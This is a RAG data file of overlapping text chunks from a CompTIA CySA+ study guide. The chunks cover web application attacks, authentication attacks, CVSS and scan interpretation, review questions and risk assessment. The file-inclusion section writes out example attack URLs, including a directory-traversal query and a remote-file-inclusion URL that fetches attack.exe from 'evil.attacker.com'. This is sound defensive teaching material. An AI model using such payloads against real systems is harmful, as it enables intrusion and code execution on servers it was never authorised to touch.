rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	name of the policy in a query string, such as this one: www.myserver.com/policy?document='aup.pdf' The web application might see this query string and then go to the policy store and retrieve a document called aup.pdf. If an attacker knows that the policy store is located on the same server as payroll records, they might try using the following query string to retrieve Mike’s payroll records: www.myserver.com/policy?document='../payroll/mike.pdf' 280 Chapter 7 ■ Analyzing Vulnerability Scans This query string seeks to traverse the directory structure of the storage server, navigating up to the parent directory of the policy folder and then down into the payroll directory. Developers and security professionals should implement three types of controls to protect against directory traversal attacks. First, application designs should avoid including filenames in user-­manipulatable fields, such as query strings. Second, input validation should prevent the use of special characters required to perform directory traversal. Finally, access controls on storage servers should restrict the web server’s access to files authorized for public access. File Inclusion File inclusion attacks take directory traversal to the next level. Instead of simply retrieving a file from the local operating system and displaying it to the attacker, file inclusion attacks actually execute the code contained within a file, allowing the attacker to fool the web server into executing arbitrary code. File inclusion attacks come in two variants: Local file inclusion (LFI) attacks seek to execute code stored in a file located elsewhere on the web server. They work in a manner very similar to a directory traversal attack. For example, an attacker might use the following URL to execute a file named attack .exe that is stored in the C:\www\uploads directory on a Windows server: www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe Remote file inclusion (RFI) attacks allow the attacker to go a step further and execute code that is stored on a remote server. These attacks are especially dangerous because the attacker can directly control the code being executed without having to first store a file on the local server. For example, an attacker might use this URL to execute an attack file stored on a remote server: www.mycompany.com/app.php?include=http://evil.attacker.com/ attack.exe When attackers discover a file inclusion vulnerability, they often exploit it to upload a web shell to the server. Web shells allow the attacker to execute commands on the server and view the results in the browser. This approach provides the attacker with access to the server over commonly used HTTP and HTTPS ports, making their traffic less vulnerable to detection by security tools. In addition, the attacker may even repair the initial vulnerability they used to gain access to the server to prevent its discovery by another attacker seeking to take control of the server or by a security team who then might be tipped off to the successful attack. Request Forgery Request forgery attacks exploit trust relationships and attempt to have users unwittingly execute commands against a remote server. They come in two forms: cross-­site request forgery and server-­side request forgery. Common Vulnerabilities 281 Cross-­Site Request
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	commonly used HTTP and HTTPS ports, making their traffic less vulnerable to detection by security tools. In addition, the attacker may even repair the initial vulnerability they used to gain access to the server to prevent its discovery by another attacker seeking to take control of the server or by a security team who then might be tipped off to the successful attack. Request Forgery Request forgery attacks exploit trust relationships and attempt to have users unwittingly execute commands against a remote server. They come in two forms: cross-­site request forgery and server-­side request forgery. Common Vulnerabilities 281 Cross-­Site Request Forgery (CSRF/XSRF) Cross-­site request forgery attacks, abbreviated as XSRF or CSRF attacks, are similar to cross-­ site scripting attacks but exploit a different trust relationship. XSS attacks exploit the trust that a user has in a website to execute code on the user’s computer. These attacks exploit the trust that remote sites have in a user’s system to execute commands on the user’s behalf. XSRF attacks work by making the reasonable assumption that users are often logged into many different websites at the same time. Attackers then embed code in one website that sends a command to a second website. When the user clicks the link on the first site, they are unknowingly sending a command to the second site. If the user happens to be logged into that second site, the command may succeed. Consider, for example, an online banking site. An attacker who wants to steal funds from user accounts might go to an online forum and post a message containing a link. That link actually goes directly into the money transfer site that issues a command to transfer funds to the attacker’s account. The attacker then leaves the link posted on the forum and waits for an unsuspecting user to come along and click the link. If the user happens to be logged into the banking site, the transfer succeeds. Developers should protect their web applications against XSRF attacks. One way to do this is to create web applications that use secure tokens that the attacker would not know to embed in the links. Another safeguard is for sites to check the referring URL in requests received from end users and only accept requests that originated from their own site. Server-­Side Request Forgery (SSRF) Server-­side request forgery (SSRF) attacks exploit a similar vulnerability but instead of tricking a user’s browser into visiting a URL, they trick a server into visiting a URL based upon user-­supplied input. SSRF attacks are possible when a web application accepts URLs from a user as input and then retrieves information from that URL. If the server has access to non-­ public URLs, an SSRF attack can unintentionally disclose that information to an attacker. Identification and Authentication Failures There are a few common methods of targeting identity and access management systems as well as the use of identity information, each with common protection methods that can help to remediate them. Many of these
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a user’s browser into visiting a URL, they trick a server into visiting a URL based upon user-­supplied input. SSRF attacks are possible when a web application accepts URLs from a user as input and then retrieves information from that URL. If the server has access to non-­ public URLs, an SSRF attack can unintentionally disclose that information to an attacker. Identification and Authentication Failures There are a few common methods of targeting identity and access management systems as well as the use of identity information, each with common protection methods that can help to remediate them. Many of these have broken access control systems at their core—­ poorly designed or improperly implemented access control systems expose organizations to a variety of attacks. These include password spraying, credential stuffing, impersonation, on-­path, and session hijacking attacks. Password Reuse Two common authentication vulnerabilities arise because of the propensity of users to reuse the same passwords across multiple sites: Password spraying attacks occur when an attacker uses a list of common passwords and attempts to log into many different user accounts with those common passwords. 282 Chapter 7 ■ Analyzing Vulnerability Scans The attacker only needs to find one valid username/password combination to gain access to the system. This attack is successful when users do not choose sufficiently unique passwords. Credential stuffing attacks occur when an attacker takes a list of usernames and passwords that were stolen in the compromise of one website and uses them to attempt to gain access to a different, potentially unrelated, website. Credential stuffing attacks are successful when users reuse the same password across many different sites. In addition to encouraging strong password management practices, administrators can further protect themselves against password reuse vulnerabilities by requiring the use of multifactor authentication on sensitive systems. Impersonation Impersonation attacks occur when an attacker takes on the identity of a legitimate user. Security issues like OAuth open redirects can allow impersonation to occur. Preventing impersonation may require stronger session handling techniques like those found in the OWASP session management cheat sheet at http://cheatsheetseries.owasp.org/ cheatsheets/Session_Management_Cheat_Sheet.html. Other types of impersonation may be prevented by securing session identifiers that attackers might otherwise acquire, either on the local workstation or via the network. On-­Path Attacks On-­path attacks, also known as man-­in-­the-­middle (MitM) attacks, occur when an attacker is able to interfere in the communication flow between two systems. For example, imagine that a user named Alice is seeking to communicate with her bank’s web server, as shown in Figure 7.18. F I G U R E 7. 1 8 Alice communicating with a bank web server TLS Alice Bank server Figure 7.18 shows the normal communication, where Alice sets up an HTTPS connection and then communicates securely with the web server. If an eavesdropper sees the network traffic related to this connection, they cannot read the communications because they are encrypted. However, if an attacker is able to impersonate the bank’s web server, as shown in Figure 7.19, the attacker can accept Alice’s connection request
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Alice is seeking to communicate with her bank’s web server, as shown in Figure 7.18. F I G U R E 7. 1 8 Alice communicating with a bank web server TLS Alice Bank server Figure 7.18 shows the normal communication, where Alice sets up an HTTPS connection and then communicates securely with the web server. If an eavesdropper sees the network traffic related to this connection, they cannot read the communications because they are encrypted. However, if an attacker is able to impersonate the bank’s web server, as shown in Figure 7.19, the attacker can accept Alice’s connection request and then establish their own connection to the legitimate bank server. The attacker then sees all of the requests coming from Alice and passes them on to the legitimate server, impersonating Alice. The attacker then sends the bank’s responses to Alice. The attacker is serving as the intermediary. Common Vulnerabilities F I G U R E 7. 1 9 283 On-­path attack TLS Alice TLS Attacker Bank server End-­to-­end encryption of sessions or network links can help reduce the chance of a successful on-­path attack, unless attackers control endpoints or have the encryption keys. Session Hijacking Session hijacking focuses on taking over an already existing session, either by acquiring the session key or cookies used by the remote server to validate the session or by causing the session to pass through a system the attacker controls, allowing them to participate in the session. Much like impersonation and on-­path attacks, securing the data that an attacker needs to acquire to hijack the session, either via encrypting network sessions or links or on the local system, can help limit opportunities for session hijacking. Data Poisoning Machine learning is a technical discipline designed to apply the principles of computer science and statistics to uncover knowledge hidden in the data that we accumulate every day. Machine learning techniques analyze data to uncover trends, categorize records, and help us run our businesses more efficiently. Many machine learning techniques use a training dataset of past activity to generate a model that may be used to make predictions about the future. If an attacker is able to modify or influence the creation of the training dataset, they can cause changes in the models that companies use to make critical business decisions. Data poisoning attacks try to manipulate training datasets in a way that causes machine learning algorithms to create inaccurate models. Exam Note Given a scenario on the exam, you need to be able to recommend the proper controls to mitigate the many attacks and software vulnerabilities detailed throughout this section. 284 Chapter 7 ■ Analyzing Vulnerability Scans Summary Vulnerability management programs produce a significant amount of information that requires analysis by trained cybersecurity professionals. Cybersecurity analysts must be familiar with the interpretation of vulnerability scan results and the prioritization of remediation efforts to provide value to their organizations. Vulnerability scanners usually rank detected issues using the Common Vulnerability Scoring System (CVSS). CVSS provides six measures of
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to create inaccurate models. Exam Note Given a scenario on the exam, you need to be able to recommend the proper controls to mitigate the many attacks and software vulnerabilities detailed throughout this section. 284 Chapter 7 ■ Analyzing Vulnerability Scans Summary Vulnerability management programs produce a significant amount of information that requires analysis by trained cybersecurity professionals. Cybersecurity analysts must be familiar with the interpretation of vulnerability scan results and the prioritization of remediation efforts to provide value to their organizations. Vulnerability scanners usually rank detected issues using the Common Vulnerability Scoring System (CVSS). CVSS provides six measures of each vulnerability: the access vector metric, the access complexity metric, the authentication metric, the confidentiality metric, the integrity metric, and the availability metric. Together, these metrics provide a look at the potential that a vulnerability will be successfully exploited and the impact it could have on the organization. As analysts interpret scan results, they should be careful to watch for common issues. False positive reports occur when the scanner erroneously reports a vulnerability that does not actually exist. If an analyst is suspicious about the accuracy of a result, they should verify it manually. When verifying a vulnerability, analysts should draw on their own expertise as well as the subject matter expertise of others throughout the organization. To successfully interpret vulnerability reports, analysts must be familiar with the vulnerabilities that commonly occur. Exam Essentials Explain how vulnerability scan reports provide critical information to cybersecurity analysts. In addition to providing details about the vulnerabilities present on a system, vulnerability scan reports also offer crucial severity and troubleshooting information. The report typically includes the request and response that triggered a vulnerability report as well as a suggested solution to the problem. Analysts must understand how to identify, validate, and remediate vulnerabilities that occur. Know the purpose of the Common Vulnerability Scoring System (CVSS). The CVSS base score computes a standard measure on a 10-­point scale that incorporates information about the access vector required to exploit a vulnerability, the complexity of the exploit, and the authentication required to execute an attack. The base score also considers the impact of the vulnerability on the confidentiality, integrity, and availability of the affected system. Explain how servers and endpoint devices are a common source of vulnerability. Missing patches and outdated operating systems are two of the most common vulnerability sources and are easily corrected by proactive device maintenance. Buffer overflow, privilege escalation, and arbitrary code execution attacks typically exploit application flaws. Devices supporting insecure protocols are also a common source of vulnerabilities. Lab Exercises 285 Explain how critical infrastructure and specialized technologies add complexity to vulnerability scanning. Cybersecurity analysts should understand how to conduct and interpret scans against mobile devices and operational technology (OT) components. Recognize the difficulty added by scanning vehicles, drones, building automation systems, physical access control systems, and industrial control systems. Know that software vulnerabilities require cooperation between analysts and developers. Web applications, in particular, are susceptible to SQL and XML injection attacks.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	device maintenance. Buffer overflow, privilege escalation, and arbitrary code execution attacks typically exploit application flaws. Devices supporting insecure protocols are also a common source of vulnerabilities. Lab Exercises 285 Explain how critical infrastructure and specialized technologies add complexity to vulnerability scanning. Cybersecurity analysts should understand how to conduct and interpret scans against mobile devices and operational technology (OT) components. Recognize the difficulty added by scanning vehicles, drones, building automation systems, physical access control systems, and industrial control systems. Know that software vulnerabilities require cooperation between analysts and developers. Web applications, in particular, are susceptible to SQL and XML injection attacks. All software may contain buffer, integer, and heap overflow vulnerabilities. Correcting these problems often requires rewriting code and rescanning vulnerable applications to confirm proper remediation. Know how to analyze the indicators associated with application attacks. Software applications may suffer from a wide range of vulnerabilities that make them susceptible to attack. You should be familiar with these attacks, including cross-­site scripting, overflow vulnerabilities, data poisoning, broken access controls, cryptographic failures, injection flaws, request forgery attacks, and the many other ways that attackers can exploit application code. Understanding the methods behind these attacks helps security professionals build adequate defenses and identify attacks against their organizations. Lab Exercises Activity 7.1: Interpret a Vulnerability Scan In Activity 6.2, you ran a vulnerability scan of a network under your control. In this lab, you will interpret the results of that vulnerability scan. Review the scan results carefully and develop a remediation plan for your network. This plan should carefully consider the severity of each vulnerability, the potential that each may be a false positive result, and the time required to complete the remediation. Activity 7.2: Analyze a CVSS Vector In this lab, you will interpret the CVSS vectors found in a vulnerability scan report to assess the severity and impact of two vulnerabilities. Review the vulnerability reports in Figures 7.20 and 7.21. 286 Chapter 7 ■ Analyzing Vulnerability Scans F I G U R E 7. 2 0 First vulnerability report F I G U R E 7. 2 1 Second vulnerability report As you review the report, you may note that the CVSS vectors indicate that they are displayed in CVSS v3.0 format. There are no differences in the calculation of base scores between CVSS v3.0 and v3.1. You may encounter v3.0 on many scan reports and should apply the formulas in the same way. Lab Exercises 287 Explain the components of the CVSS vector for each of these vulnerabilities. Which vulnerability is more serious? Why? Activity 7.3: Remediate a Vulnerability In this lab, you will remediate one of the vulnerabilities that you identified in Activity 7.1. 1. Review the scan report from Activity 7.1 and select a vulnerability that is a high remediation priority where you have the ability to correct the issue yourself. 2. Perform the remediation. 3. Run a new vulnerability scan to confirm that the vulnerability was successfully remediated. Chapter 7 288 ■ Analyzing Vulnerability Scans Review Questions 1.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	same way. Lab Exercises 287 Explain the components of the CVSS vector for each of these vulnerabilities. Which vulnerability is more serious? Why? Activity 7.3: Remediate a Vulnerability In this lab, you will remediate one of the vulnerabilities that you identified in Activity 7.1. 1. Review the scan report from Activity 7.1 and select a vulnerability that is a high remediation priority where you have the ability to correct the issue yourself. 2. Perform the remediation. 3. Run a new vulnerability scan to confirm that the vulnerability was successfully remediated. Chapter 7 288 ■ Analyzing Vulnerability Scans Review Questions 1. 2. 3. 4. 5. Tom is reviewing a vulnerability scan report and finds that one of the servers on his network suffers from an internal IP address disclosure vulnerability. What technology is likely in use on this network that resulted in this vulnerability? A. TLS B. NAT C. SSH D. VPN Which one of the CVSS metrics would contain information about the type of account access that an attacker must have to execute an attack? A. AV B. C C. PR D. AC Which one of the following values for the CVSS attack complexity metric would indicate that the specified attack is simplest to exploit? A. High B. Medium C. Low D. Severe Which one of the following values for the confidentiality, integrity, or availability CVSS metric would indicate the potential for total compromise of a system? A. N B. L C. M D. H What is the most recent version of CVSS that is currently available? A. 2.0 B. 2.5 C. 3.1 D. 3.2 Review Questions 6. 7. 8. 9. 289 Which one of the following metrics is not included in the calculation of the CVSS exploitability score? A. Attack vector B. Vulnerability age C. Attack complexity D. Privileges required Kevin recently identified a new software vulnerability and computed its CVSS base score as 6.5. Which risk category would this vulnerability fall into? A. Low B. Medium C. High D. Critical Tara recently analyzed the results of a vulnerability scan report and found that a vulnerability reported by the scanner did not exist because the system was actually patched as specified. What type of error occurred? A. False positive B. False negative C. True positive D. True negative Which one of the following is not a common source of information that may be correlated with vulnerability scan results? A. Logs B. Database tables C. SIEM D. Configuration management system 10. Which one of the following operating systems should be avoided on production networks? A. Windows Server 2008 R2 B. Red Hat Enterprise Linux 9 C. Debian Linux 11 D. Ubuntu 22 11. In what type of attack does the attacker place more information in a memory location than is allocated for that use? A. SQL injection B. LDAP injection C. Cross-­site scripting D. Buffer overflow Chapter 7 290 ■ Analyzing Vulnerability Scans 12. The Dirty COW attack is an example of what type of vulnerability? A. Malicious code B.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Logs B. Database tables C. SIEM D. Configuration management system 10. Which one of the following operating systems should be avoided on production networks? A. Windows Server 2008 R2 B. Red Hat Enterprise Linux 9 C. Debian Linux 11 D. Ubuntu 22 11. In what type of attack does the attacker place more information in a memory location than is allocated for that use? A. SQL injection B. LDAP injection C. Cross-­site scripting D. Buffer overflow Chapter 7 290 ■ Analyzing Vulnerability Scans 12. The Dirty COW attack is an example of what type of vulnerability? A. Malicious code B. Privilege escalation C. Buffer overflow D. LDAP injection 13. Which one of the following protocols should never be used on a public network? A. SSH B. HTTPS C. SFTP D. Telnet 14. Betty is selecting a transport encryption protocol for use in a new public website she is creating. Which protocol would be the best choice? A. SSL 2.0 B. SSL 3.0 C. TLS 1.0 D. TLS 1.3 15. Which one of the following conditions would not result in a certificate warning during a vulnerability scan of a web server? A. Use of an untrusted CA B. Inclusion of a public encryption key C. Expiration of the certificate D. Mismatch in certificate name 16. What type of attack depends on the fact that users are often logged into many websites simultaneously in the same browser? A. SQL injection B. Cross-­site scripting C. Cross-­site request forgery D. File inclusion 17. Bonnie discovers entries in a web server log indicating that penetration testers attempted to access the following URL: www.mycompany.com/sortusers.php?file=C:\uploads\attack.exe What type of attack did they most likely attempt? A. Reflected XSS B. Persistent XSS C. Local file inclusion D. Remote file inclusion Review Questions 291 18. Which one of the following terms is not typically used to describe the connection of physical devices to a network? A. IoT B. IDS C. SCADA D. ICS 19. Monica discovers that an attacker posted a message in a web forum that she manages that is attacking users who visit the site. Which one of the following attack types is most likely to have occurred? A. SQL injection B. Malware injection C. LDAP injection D. Cross-­site scripting 20. Alan is reviewing web server logs after an attack and finds many records that contain semicolons and apostrophes in queries from end users. What type of attack should he suspect? A. SQL injection B. LDAP injection C. Cross-­site scripting D. Buffer overflow Chapter 8 Responding to Vulnerabilities THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 2.0: Vulnerability Management ✓✓ 2.1: Given a scenario, implement vulnerability scanning methods and concepts ■■ Fuzzing ✓✓ 2.2: Given a scenario, analyze output from vulnerability assessment tools ■■ Debuggers ✓✓ 2.5: Explain concepts related to vulnerability response, handling, and management ■■ Compensating control ■■ Control types ■■ Patching and configuration management ■■ Maintenance windows ■■ Exceptions ■■ Risk management principles ■■ Policies, governance, and service-­level objectives
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	should he suspect? A. SQL injection B. LDAP injection C. Cross-­site scripting D. Buffer overflow Chapter 8 Responding to Vulnerabilities THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 2.0: Vulnerability Management ✓✓ 2.1: Given a scenario, implement vulnerability scanning methods and concepts ■■ Fuzzing ✓✓ 2.2: Given a scenario, analyze output from vulnerability assessment tools ■■ Debuggers ✓✓ 2.5: Explain concepts related to vulnerability response, handling, and management ■■ Compensating control ■■ Control types ■■ Patching and configuration management ■■ Maintenance windows ■■ Exceptions ■■ Risk management principles ■■ Policies, governance, and service-­level objectives (SLOs) ■■ Prioritization and excalation ■■ Attack surface management ■■ Secure coding best practices ■■ Secure software development life cycle (SDLC) ■■ Threat modeling In Chapters 6 and 7, you learned about the various ways that organizations conduct vulnerability scans and interpret the results of those scans. In this chapter, we turn our attention to what happens next—­the ways that organizations respond to vulnerabilities that exist in their environments. We’ll begin by covering the risk management process, and then we’ll dive into specific ways that you can respond to vulnerabilities. Analyzing Risk We operate in a world full of risks. If you left your home and drove to your office this morning, you encountered a large number of risks. You could have been involved in an automobile accident, encountered a train delay, been struck by a bicycle on the sidewalk, or even contracted a dangerous virus from another rider in an elevator. We’re aware of these risks in the back of our minds, but we don’t let them paralyze us. Instead, we take simple precautions to help manage the risks that we think have the greatest potential to disrupt our lives. In an enterprise risk management (ERM) program, organizations take a formal approach to risk analysis that begins with identifying risks, continues with determining the severity of each risk, and then results in adopting one or more risk management strategies to address each risk. Before we move too deeply into the risk assessment process, let’s define a few important terms that we’ll use during our discussion: ■■ ■■ ■■ Threats are any possible events that might have an adverse impact on the confidentiality, integrity, and/or availability of our information or information systems. Vulnerabilities are weaknesses in our systems or controls that could be exploited by a threat. Risks occur at the intersection of a vulnerability and a threat that might exploit that vulnerability. A threat without a corresponding vulnerability does not pose a risk, nor does a vulnerability without a corresponding threat. Figure 8.1 illustrates this relationship between threats, vulnerabilities, and risks. Consider the example from earlier of walking down the sidewalk on your way to work. The fact that you are on the sidewalk without any protection is a vulnerability. A bicycle speeding down that sidewalk is a threat. The result of this combination of factors is that you are at risk of being hit by the bicycle on
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the intersection of a vulnerability and a threat that might exploit that vulnerability. A threat without a corresponding vulnerability does not pose a risk, nor does a vulnerability without a corresponding threat. Figure 8.1 illustrates this relationship between threats, vulnerabilities, and risks. Consider the example from earlier of walking down the sidewalk on your way to work. The fact that you are on the sidewalk without any protection is a vulnerability. A bicycle speeding down that sidewalk is a threat. The result of this combination of factors is that you are at risk of being hit by the bicycle on the sidewalk. If you remove the vulnerability by parking in a garage beneath your building, you are no longer at risk for that particular Analyzing Risk 295 threat. Similarly, if the city erects barriers that prevent bicycles from entering the sidewalk, you are also no longer at risk. Risks Vulnerabilities Risk exists at the intersection of a threat and a corresponding vulnerability. Threats FIGURE 8.1 Let’s consider another example drawn from the world of cybersecurity. In Chapters 6 and 7, you learned about the vulnerability management process. Organizations regularly conduct vulnerability scans designed to identify potential vulnerabilities in their environment. One of these scans might identify a server that exposes TCP port 22 to the world, allowing brute-­force SSH attempts by an attacker. An attacker with a brute-­force scanning tool presents a threat. The combination of the port exposure and the existence of attackers presents a risk. In this case, you don’t have any way to eliminate attackers, so you can’t really address the threat, but you do have control over the services running on your systems. If you shut down the SSH service and close port 22, you eliminate the vulnerability and, therefore, also eliminate the risk. Of course, we can’t always completely eliminate a risk because it isn’t always feasible to shut down services. We might decide instead to take actions that reduce the risk. We’ll talk more about those options when we get to risk management strategies later in this chapter. Risk Identification The risk identification process requires identifying the threats and vulnerabilities that exist in your operating environment. We’ve already covered the many ways that you might conduct risk identification in this book; we just haven’t put them together in the big picture frame of risk management. Chapters 4 and 5 discussed the concepts of threat intelligence. You learned how you can leverage internal and external information sources to identify the many threats facing your organization. Chapters 6 and 7 discussed the concepts of vulnerability management. You learned how you can create a vulnerability management program for your organization and how you can automate portions of that program through routine vulnerability scans. 296 Chapter 8 ■ Responding to Vulnerabilities There’s not much more to the risk identification process. You may already be conducting all the technical activities that you need to identify risks. Now you just need to pull that information together and develop a comprehensive
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	intelligence. You learned how you can leverage internal and external information sources to identify the many threats facing your organization. Chapters 6 and 7 discussed the concepts of vulnerability management. You learned how you can create a vulnerability management program for your organization and how you can automate portions of that program through routine vulnerability scans. 296 Chapter 8 ■ Responding to Vulnerabilities There’s not much more to the risk identification process. You may already be conducting all the technical activities that you need to identify risks. Now you just need to pull that information together and develop a comprehensive list of threats, vulnerabilities, and risks. Risk Calculation Not all risks are equal. Returning to the example of a pedestrian on the street, the risk of being hit by a bicycle is far more worrisome than the risk of being struck down by a meteor. That makes intuitive sense, but let’s explore the underlying thought process that leads to that conclusion. It’s a process called risk calculation. When we evaluate any risk, we do so by using two different factors: ■■ ■■ The probability, or likelihood, that the risk will occur. We might express this as the percent chance that a threat will exploit a vulnerability over a specified period of time, such as within the next year. The magnitude, or impact, that the risk will have on the organization if it does occur. We might express this as the financial cost that we will incur as the result of a risk, although there are other possible measures. Exam Note The two factors that contribute to the degree of a risk are its probability and its magnitude (or impact). Keep this in the back of your mind as you approach any questions about risk on the CySA+ exam. Using these two factors, we can assign each risk a conceptual score by combining the probability and the magnitude. This leads many risk analysts to express the severity of a risk using this formula: Risk Severity Probability Magnitude It’s important to point out that this equation does not always have to be interpreted literally. Although you may wind up multiplying these values together in some risk assessment processes, it’s best to think of this conceptually as combining the probability and magnitude to determine the severity of a risk. When we assess the risks of being struck by a bicycle or a meteor on the street, we can use these factors to evaluate the risk severity. There might be a high probability that we will be struck by a bicycle. That type of accident might have a moderate magnitude, leaving us willing to consider taking steps to reduce our risk. Being struck by a meteor would clearly have a catastrophic magnitude of impact, but the probability of such an incident is incredibly unlikely, leading us to acknowledge the risk and move on without changing our behavior. Analyzing Risk 297 Business Impact Analysis The business impact analysis (BIA) is a formalized approach to risk
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	on the street, we can use these factors to evaluate the risk severity. There might be a high probability that we will be struck by a bicycle. That type of accident might have a moderate magnitude, leaving us willing to consider taking steps to reduce our risk. Being struck by a meteor would clearly have a catastrophic magnitude of impact, but the probability of such an incident is incredibly unlikely, leading us to acknowledge the risk and move on without changing our behavior. Analyzing Risk 297 Business Impact Analysis The business impact analysis (BIA) is a formalized approach to risk prioritization that allows organizations to conduct their reviews in a structured manner. BIAs follow two different analysis methodologies: ■■ ■■ Quantitative risk assessments use numeric data in the analysis, resulting in assessments that allow the very straightforward prioritization of risks. Qualitative risk assessments substitute subjective judgments and categories for strict numerical analysis, allowing the assessment of risks that are difficult to quantify. As organizations seek to provide clear communication of risk factors to stakeholders, they often combine elements of quantitative and qualitative risk assessments. Let’s review each of these approaches. Quantitative Risk Assessment Most quantitative risk assessment processes follow a similar methodology that includes the following steps: 1. Determine the asset value (AV) of the asset affected by the risk. This asset value (AV) is expressed in dollars, or other currency, and may be determined using the cost to acquire the asset, the cost to replace the asset, or the depreciated cost of the asset, depending on the organization’s preferences. 2. Determine the likelihood that the risk will occur. Risk analysts consult subject matter experts and determine the likelihood that a risk will occur in a given year. This is expressed as the number of times the risk is expected each year and is described as the annualized rate of occurrence (ARO). A risk that is expected to occur twice a year has an ARO of 2.0, whereas a risk that is expected once every one hundred years has an ARO of 0.01. 3. Determine the amount of damage that will occur to the asset if the risk materializes. This is known as the exposure factor (EF) and is expressed as the percentage of the asset expected to be damaged. The exposure factor of a risk that would completely destroy an asset is 100 percent, whereas a risk that would damage half of an asset has an EF of 50 percent. 4. Calculate the single loss expectancy. The single loss expectancy (SLE) is the amount of financial damage expected each time a risk materializes. It is calculated by multiplying the AV by the EF. 5. Calculate the annualized loss expectancy. The annualized loss expectancy (ALE) is the amount of damage expected from a risk each year. It is calculated by multiplying the SLE and the ARO. It’s important to note that these steps assess the quantitative scale of a single risk—­that is, one combination of a threat and a vulnerability.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	damage half of an asset has an EF of 50 percent. 4. Calculate the single loss expectancy. The single loss expectancy (SLE) is the amount of financial damage expected each time a risk materializes. It is calculated by multiplying the AV by the EF. 5. Calculate the annualized loss expectancy. The annualized loss expectancy (ALE) is the amount of damage expected from a risk each year. It is calculated by multiplying the SLE and the ARO. It’s important to note that these steps assess the quantitative scale of a single risk—­that is, one combination of a threat and a vulnerability. Organizations conducting quantitative risk assessments would repeat this process for each threat/vulnerability combination. 298 Chapter 8 ■ Responding to Vulnerabilities Let’s walk through an example of a quantitative risk assessment. Imagine that you are concerned about the risk associated with a denial-­of-­service (DoS) attack against your email server. Your organization uses that server to send email messages to customers offering products for sale. It generates $1,000 in sales per hour that it is in operation. After consulting threat intelligence sources, you believe that a DoS attack is likely to occur three times a year and last for three hours before you are able to control it. The asset in this case is not the server itself, because the server will not be physically damaged. The asset is the ability to send email and you have already determined that it is worth $1,000 per hour. The asset value for three hours of server operation is, therefore, $3,000. Your threat intelligence estimates that the risk will occur three times per year, making your annualized rate of occurrence 3.0. After consulting your email team, you believe that the server would operate at 10 percent capacity during a DoS attack, as some legitimate messages would get out. Therefore, your exposure factor is 90 percent, because 90 percent of the capacity would be consumed by the attack. Your single loss expectancy is calculated by multiplying the asset value ($3,000) by the exposure factor (90 percent) to get the expected loss during each attack. This gives you an SLE of $27,000. Your annualized loss expectancy is the product of the SLE ($27,000) and the ARO (3.0), or $81,000. Organizations can use the ALEs that result from a quantitative risk assessment to prioritize their remediation activities and determine the appropriate level of investment in controls that mitigate risks. For example, it would not normally make sense (at least in a strictly financial sense) to spend more than the ALE on an annual basis to protect against a risk. In the previous example, if a DoS prevention service would block all of those attacks, it would make financial sense to purchase it if the cost is less than $81,000 per year. Qualitative Risk Assessment Quantitative techniques work very well for evaluating financial risks and other risks that can be clearly expressed in numeric terms. Many risks, however, do not easily lend themselves to quantitative analysis. For example, how
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	risks. For example, it would not normally make sense (at least in a strictly financial sense) to spend more than the ALE on an annual basis to protect against a risk. In the previous example, if a DoS prevention service would block all of those attacks, it would make financial sense to purchase it if the cost is less than $81,000 per year. Qualitative Risk Assessment Quantitative techniques work very well for evaluating financial risks and other risks that can be clearly expressed in numeric terms. Many risks, however, do not easily lend themselves to quantitative analysis. For example, how would you describe reputational damage, public health and safety, or employee morale in quantitative terms? You might be able to draw some inferences that tie these issues back to financial data, but the bottom line is that quantitative techniques simply aren’t well suited to evaluating these risks. Qualitative risk assessment techniques seek to overcome the limitations of quantitative techniques by substituting subjective judgment for objective data. Qualitative techniques still use the same probability and magnitude factors to evaluate the severity of a risk, but do so using subjective categories. For example, Figure 8.2 shows a simple qualitative risk assessment that evaluates the probability and magnitude of several risks on a subjective “Low/Medium/High” scale. Risks are placed on this chart based on the judgments made by subject matter experts. Analyzing Risk 299 High F I G U R E 8 . 2 Qualitative risk assessments use subjective rating scales to evaluate probability and magnitude. Datacenter Intrusion Website DDoS Stolen Unencrypted Device Medium Low Magnitude Spear phishing Malware on Endpoint Guest User Retains Network Access Low Medium High Probability Although it’s not possible to directly calculate the financial impact of risks that are assessed using qualitative techniques, this risk assessment scale makes it possible to prioritize risks. For example, reviewing the risk assessment in Figure 8.2, we can determine that the greatest risks facing this organization are stolen unencrypted devices and spear phishing attacks. Both of these risks share a high probability and high magnitude of impact. If we’re considering using funds to add better physical security to the datacenter, this risk assessment informs us that our time and money would likely be better spent on full-­disk encryption for mobile devices and a secure email gateway. Many organizations combine quantitative and qualitative techniques to get a well-­rounded picture of both the tangible and the intangible risks they face. Supply Chain Assessment When evaluating the risks to your organization, don’t forget about the risks that occur based on third-­party relationships. You rely on many different vendors to protect the confidentiality, integrity, and availability of your data. Performing vendor due diligence is a crucial security responsibility. 300 Chapter 8 ■ Responding to Vulnerabilities (continued) For example, how many cloud service providers handle your organization’s sensitive information? Those vendors become a crucial part of your supply chain from both operational and security perspectives. If they don’t have adequate security controls in place, your data is
